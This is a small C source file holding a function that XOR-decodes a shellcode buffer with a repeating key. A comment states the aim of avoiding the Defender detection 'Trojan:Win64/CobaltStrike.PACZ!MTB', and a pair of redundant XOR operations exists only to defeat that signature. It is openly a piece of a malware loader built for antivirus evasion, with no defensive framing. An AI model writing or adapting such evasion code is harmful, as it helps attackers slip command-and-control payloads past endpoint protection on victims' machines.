#include <string.h>
#include <windows.h>

void xorShellcode( unsigned char * shellcode, size_t shellcodeSize, const char * key ) {
    size_t keyLen = strlen( key );
    unsigned char temp;

    for ( size_t i = 0; i < shellcodeSize; ++i ) {
        temp = key[i % keyLen];

        /* Avoid: Trojan:Win64/CobaltStrike.PACZ!MTB */
        temp ^= 0xFF;
        temp ^= 0xFF;

        shellcode[i] ^= temp;
    }
}
